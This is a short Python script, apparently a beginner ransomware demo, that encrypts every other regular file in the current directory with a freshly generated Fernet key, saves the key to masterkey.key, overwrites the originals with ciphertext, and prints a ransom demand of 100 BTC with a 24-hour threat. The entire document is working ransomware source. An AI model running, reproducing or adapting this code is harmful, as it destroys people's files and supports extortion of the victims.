#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# let's find some files

files = []

for file in os.listdir():
        if file == "voldemort.py" or file == "masterkey.key" or file == "potter.py":
                continue
        if os.path.isfile(file):
                files.append(file)
                
print(files)

key = Fernet.generate_key()

with open("masterkey.key", "wb") as masterkey:
        masterkey.write(key)
        
for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
            
print("All of your files have been encrypted! Send me 100 BTC or all your files will be lost forever within 24 hours.")
